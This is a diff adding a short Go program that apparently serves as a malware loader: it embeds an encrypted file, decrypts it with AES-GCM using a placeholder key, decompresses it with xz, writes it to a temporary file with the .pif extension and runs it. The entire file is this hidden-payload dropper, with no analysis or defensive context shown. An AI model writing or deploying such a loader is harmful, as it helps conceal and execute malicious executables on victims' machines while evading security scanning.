@@ -1,0 +1,45 @@
+package main
+
+import (
+	"bytes"
+	"crypto/aes"
+	"crypto/cipher"
+	_ "embed"
+	"os"
+	"os/exec"
+
+	"github.com/ulikunitz/xz"
+)
+
+//go:embed payload.tmp
+var payload []byte
+
+func decompress(data []byte) []byte {
+	var buff bytes.Buffer
+	reader, _ := xz.NewReader(bytes.NewReader(data))
+
+	buff.ReadFrom(reader)
+	return buff.Bytes()
+}
+
+func decrypt(data, key []byte) []byte {
+	aesBlock, _ := aes.NewCipher(key)
+	gcm, _ := cipher.NewGCM(aesBlock)
+
+	nonce := data[:gcm.NonceSize()]
+	data = data[gcm.NonceSize():]
+
+	data, _ = gcm.Open(nil, nonce, data, nil)
+	return data
+}
+
+func main() {
+	payload = decrypt(payload, []byte("<KEY>"))
+	payload = decompress(payload)
+
+	file, _ := os.CreateTemp("", "*.pif")
+	file.Write(payload)
+	file.Close()
+
+	exec.Command(file.Name()).Start()
+}
